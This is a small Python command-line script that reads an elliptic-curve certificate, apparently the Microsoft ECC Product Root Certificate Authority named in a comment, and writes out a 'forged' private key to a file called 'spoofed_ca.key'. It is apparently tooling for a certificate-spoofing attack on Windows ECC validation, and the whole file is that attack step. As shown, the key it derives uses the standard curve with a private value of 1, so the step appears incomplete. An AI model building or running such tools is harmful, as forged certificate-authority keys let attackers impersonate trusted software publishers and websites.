import click

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ec import derive_private_key
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.backends.openssl.ec import _EllipticCurvePublicKey

def pub_key(path: str) -> _EllipticCurvePublicKey:
    with open(path, 'rb') as f:
        raw_cert = f.read()
    cert       = x509.load_pem_x509_certificate(raw_cert, default_backend())
    return cert.public_key()

def forge(path: str):
    """
    given a path to a EC certificate forge a new key
    """
    public_key = pub_key(path)
    print("Found public key")
    print(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))
    # Public key for tools/MicrosoftECCProductRootCertificateAuthority.cer should be
    # b'-----BEGIN PUBLIC KEY-----\nMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAExxEWKnYdVo6+uWJl1MPOtPDDMOyPbddu\nObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V\n+34nijKh6smPyX4Yyy87LEh6fab0AQes\n-----END PUBLIC KEY-----\n'
    
    curve      = public_key.curve
    private_value = 1
    private_key   = derive_private_key(private_value, curve, default_backend())

    pem = private_key.private_bytes(
        encoding             = serialization.Encoding.PEM,
        format               = serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm = serialization.NoEncryption()
    )
    print("PEM:")
    print(pem)
    return pem

@click.command()
@click.option('-p', '--path', default=None, help='Full path to EC certificate')
@click.option('-o', '--output', default='spoofed_ca.key', help='Full output path to write forged certificate to')
@click.option('-d', '--debug', is_flag=True, default=False, help='Debug does not write keys')
def cli(path, output, debug):
    """Create forged key from EC certificate"""
    pem = forge(path)
    if debug:
        return
    with open(output, 'wb') as f:
        f.write(pem)
if __name__ == '__main__':
    cli()
